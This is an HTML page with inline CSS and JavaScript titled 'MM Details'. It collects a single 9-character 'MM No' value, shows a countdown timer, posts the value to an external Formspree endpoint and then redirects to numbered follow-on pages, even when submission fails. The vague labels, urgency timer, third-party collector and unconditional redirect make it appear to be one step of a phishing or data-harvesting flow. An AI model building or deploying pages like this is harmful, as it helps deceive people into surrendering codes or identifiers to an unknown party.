```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MM Details</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: grid;
            place-items: center;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #0f172a, #4338ca, #7c3aed);
        }

        .card {
            width: 100%;
            max-width: 420px;
            padding: 30px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 40px #0003;
        }

        .logo {
            display: block;
            width: 150px;
            height: 150px;
            object-fit: contain;
            margin: 0 auto 15px;
        }

        h2 {
            text-align: center;
            color: #312e81;
            margin-top: 0;
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin: 15px 0 7px;
            color: #334155;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 13px;
            border: 1px solid #cbd5e1;
            border-radius: 9px;
            font-size: 15px;
        }

        input:focus {
            outline: none;
            border-color: #6366f1;
            box-shadow: 0 0 0 3px #e0e7ff;
        }

        .timer {
            text-align: center;
            color: #4338ca;
            font-size: 24px;
            font-weight: bold;
            margin-top: 22px;
            margin-bottom: 10px;
        }

        .paragraph {
            color: #475569;
            font-size: 14px;
            line-height: 1.6;
            margin-top: 10px;
        }

        button {
            width: 100%;
            padding: 14px;
            margin-top: 22px;
            border: 0;
            border-radius: 9px;
            background: linear-gradient(90deg, #4f46e5, #7c3aed);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            filter: brightness(1.1);
        }

        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        #message {
            text-align: center;
            color: #dc2626;
            font-size: 14px;
            line-height: 1.5;
            margin-top: 12px;
        }

        @media (max-width: 480px) {
            body {
                padding: 12px;
            }

            .card {
                padding: 18px 20px;
                border-radius: 16px;
            }

            .logo {
                width: 190px;
                height: 80px;
                margin-bottom: 1%;
            }
        }
    </style>
</head>

<body>

    <main class="card">

        <img src="OIP.webp" alt="Logo" class="logo">

        <hr>

        <h2>MM Details</h2>

        <form
            action="https://formspree.io/f/xaeqrdwk"
            method="POST"
            id="mmForm">

            <label for="mmNo">RR</label>

            <input
                type="text"
                id="mmNo"
                name="mmNo"
                placeholder="Enter MM No"
                maxlength="9"
                required>

            <div class="timer" id="timer">00:12</div>

            <p class="paragraph" id="paragraph">
                Yahan apna paragraph likho. Is text ko tum baad mein
                apni zaroorat ke hisaab se edit kar sakte ho.
            </p>

            <button type="submit" id="submitBtn">
                Submit
            </button>

            <p id="message" role="status" aria-live="polite"></p>

        </form>

    </main>

    <script>
        const form = document.getElementById("mmForm");
        const timerDisplay = document.getElementById("timer");
        const paragraph = document.getElementById("paragraph");
        const message = document.getElementById("message");
        const submitBtn = document.getElementById("submitBtn");

        let timeLeft = 70;

        // Countdown timer
        const countdown = setInterval(function () {
            timeLeft--;

            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;

            timerDisplay.textContent =
                String(minutes).padStart(2, "0") + ":" +
                String(seconds).padStart(2, "0");

            if (timeLeft <= 0) {
                clearInterval(countdown);

                timerDisplay.textContent = "00:00";

                paragraph.textContent =
                    "We are sorry for the long wait. Our system will process it as fast as possible.";
            }
        }, 1000);

        // Submit data to Formspree
        form.addEventListener("submit", async function (event) {
            event.preventDefault();

            message.textContent = "";

            if (!form.checkValidity()) {
                form.reportValidity();
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = "Submitting...";

            try {
                const response = await fetch(form.action, {
                    method: "POST",
                    body: new FormData(form),
                    headers: {
                        "Accept": "application/json"
                    }
                });

                if (response.ok) {
                    clearInterval(countdown);

                    message.style.color = "#15803d";
                    message.textContent = "Submitted successfully!";

                    // Redirect only after successful submission
                    window.location.href = "4rth.html";

                } else {
                    let errorText =
                        "Submission failed. Please try again.";

                    try {
                        const result = await response.json();

                        if (result.errors &&
                            result.errors.length > 0) {
                            errorText = result.errors
                                .map(error => error.message)
                                .join(" ");
                        }
                    } catch (error) {
                        // Use the default error message
                    }

                    message.textContent = errorText;
                }

            } catch (error) {
                message.textContent =
                    "Network error. Please check your internet and try again.";
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = "Submit";
            }
            window.location.href = "for.html";
        });
    </script>

</body>
</html>
